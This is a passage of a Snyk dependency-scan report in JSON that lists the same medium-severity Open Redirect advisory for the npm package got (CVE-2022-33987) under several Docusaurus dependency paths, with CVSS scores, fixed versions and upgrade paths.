      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "title": "Open Redirect",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "<11.8.5",
          ">=12.0.0 <12.1.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "11.8.5",
        "12.1.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "got",
      "references": [
        {
          "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
          "title": "GitHub Diff"
        },
        {
          "url": "https://github.com/sindresorhus/got/pull/2047",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-06-29T01:11:26.531842Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-11-19T20:57:05.871669Z"
        }
      ],
